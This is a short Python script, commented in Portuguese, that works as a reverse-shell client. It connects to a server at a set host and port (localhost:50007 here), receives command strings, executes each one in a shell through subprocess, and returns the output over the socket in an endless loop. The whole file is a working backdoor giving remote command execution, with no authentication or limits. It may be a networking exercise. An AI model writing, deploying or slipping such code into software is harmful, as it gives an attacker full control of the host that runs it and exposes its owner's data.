import socket
import subprocess

HOST = 'localhost' # The remote host
PORT = 50007 # The same port as used by the server


#Executa o comando com popen3
def popen3(cmd, mode="t", bufsize=-1):
    import warnings
    msg = "os.popen3 is deprecated.  Use the subprocess module."
    warnings.warn(msg, DeprecationWarning, stacklevel=2)

    PIPE = subprocess.PIPE
    p = subprocess.Popen(cmd, shell=isinstance(cmd, str),
                         bufsize=bufsize, stdin=PIPE, stdout=PIPE,
                         stderr=PIPE, close_fds=True)
    return p.stdin, p.stdout, p.stderr


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        data = s.recv(1024)
        #Recebe o comando do servidor
        command = data.decode()
        print('O comando é ', command)
        #Recebe a saida do comando
        strdin,stdout,stderr = popen3(command)

        #Escreve a mensagem de retorno
        lines1 = stdout.readlines()
        msg = ''.encode('cp1252')
        for l in lines1:
            msg+=l
        lines2 = stderr.readlines()
        for l in lines2:
            msg+=l
        print(str(msg.decode('cp1252')))
        s.sendall(msg)
